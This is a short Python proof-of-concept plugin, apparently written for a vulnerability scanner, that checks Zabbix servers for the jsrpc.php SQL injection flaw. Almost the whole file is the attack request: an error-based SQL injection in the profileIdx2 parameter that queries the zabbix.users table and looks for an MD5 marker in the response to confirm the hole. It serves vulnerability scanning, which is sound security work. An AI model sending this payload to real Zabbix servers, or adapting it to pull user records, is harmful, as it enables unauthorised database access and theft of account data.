#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  Zabbix jsrpc.php SQL Injection
Author    :  FF0C
"""


def assign(service, arg):
    if service == fingerprint.zabbix:
        return True, arg


def audit(arg):
    payload = "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=profileldx2=(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(0x7e,md5(321),0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17"
    code, head, res, redir, log = hackhttp.http(arg + payload)
    if code == 200 and 'caf1a3dfb505ffed0d024130f58c5cfa' in res:
        security_hole(arg + payload, log=log)

if __name__ == '__main__':
    from dummy import *
    audit(assign(fingerprint.zabbix, 'http://127.0.0.1:8000/')[1])
